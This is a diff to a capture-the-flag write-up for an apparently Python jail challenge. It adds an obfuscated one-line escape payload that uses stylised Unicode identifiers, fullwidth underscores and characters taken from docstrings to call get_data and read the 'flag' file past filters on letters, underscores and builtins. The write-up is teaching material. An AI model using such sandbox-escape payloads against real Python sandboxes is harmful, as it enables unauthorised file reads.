@@ -66,10 +66,13 @@ This will access the tuple documentation and get the 38th character (g):
 ```
 Built-in immutable sequence.\n\nIf no ar(g)ument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.
 ```
-We can update (4) above using this method to get:
+We can update (4) above using this method for all 4 characters of ``flag`` to get:
 ```Python
-
+()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[0]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[121].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆('.',()._＿𝖉𝖔𝖈_＿[31]+(''!='')._＿𝖉𝖔𝖈_＿[3]+()._＿𝖉𝖔𝖈_＿[14]+()._＿𝖉𝖔𝖈_＿[38]) # (5)
 ```
+This will read the ``flag`` file, while bypassing all alphabet, double underscore, and builtins restrictions! Don't believe me? Let's do a sanity check:
+
+![img1](./images/sanity.png)
 
 **Python Solution:**
 ```Python
